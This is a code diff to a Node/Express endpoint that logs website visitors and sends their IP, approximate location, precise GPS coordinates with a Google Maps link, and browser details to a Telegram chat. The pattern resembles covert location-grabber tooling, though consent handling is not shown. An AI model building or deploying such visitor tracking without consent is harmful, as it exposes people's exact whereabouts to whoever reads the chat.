@@ -25,18 +25,27 @@ app.post('/log-location', (req, res) => {
     const logEntry = `${new Date().toISOString()} - ${JSON.stringify(req.body)}\n`;
     console.log(logEntry);
 
-    const { ip, city, region, country, lat, lon, userAgent } = req.body;
+    const { ip, city, region, country, lat, lon, accuracy, userAgent } = req.body;
 
-    const mensaje = `
-🌐 NUEVO INGRESO A LA PÁGINA
-📍 IP: ${ip || 'No disponible'}
-🌆 Ciudad: ${city || 'Desconocida'}, ${region || ''}, ${country || ''}
-🖥️ Navegador: ${userAgent || 'Desconocido'}
-🕒 Hora: ${new Date().toLocaleString()}
-    `;
+    let mensaje = `🌐 NUEVO INGRESO A LA PÁGINA\n`;
+
+    if (ip || city || country) {
+        mensaje += `📍 IP: ${ip || 'No disponible'}\n`;
+        mensaje += `🌆 Ubicación aproximada: ${city || '-'}, ${region || '-'}, ${country || '-'}\n`;
+    }
+
+    if (lat && lon) {
+        mensaje += `📌 Coordenadas precisas:\n`;
+        mensaje += `📍 Lat: ${lat}\n`;
+        mensaje += `📍 Lon: ${lon}\n`;
+        mensaje += `📏 Precisión: ±${accuracy} metros\n`;
+        mensaje += `🗺️ [Ver en Google Maps](https://www.google.com/maps?q=${lat},${lon})\n`;
+    }
+
+    mensaje += `🖥️ Navegador: ${userAgent || 'Desconocido'}\n`;
+    mensaje += `🕒 Hora: ${new Date().toLocaleString()}`;
 
     enviarATelegram(mensaje).catch(err => console.error('Error al enviar a Telegram:', err));
-
     res.sendStatus(200);
 });
 
